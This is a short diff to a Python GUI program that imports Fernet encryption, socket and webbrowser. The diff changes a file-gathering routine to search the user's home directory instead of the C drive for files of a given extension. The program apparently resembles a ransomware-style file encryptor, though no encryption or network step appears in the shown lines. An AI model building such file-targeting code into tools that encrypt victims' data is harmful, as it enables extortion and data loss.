@@ -5,6 +5,7 @@ import socket
 import webbrowser
 import datetime
 import tkinter.messagebox
+from pathlib import Path
 from cryptography.fernet import Fernet
 from tempfile import gettempdir
 from tkinter import *
@@ -136,7 +137,7 @@ class GUI(Frame):
 
     def get_files(self) -> list:
         result = []
-        for root, _, files in os.walk('C://'):
+        for root, _, files in os.walk(str(Path.home())):
             for file in files:
                 if file.endswith(file_extension):
                     result.append(os.path.join(root, file))
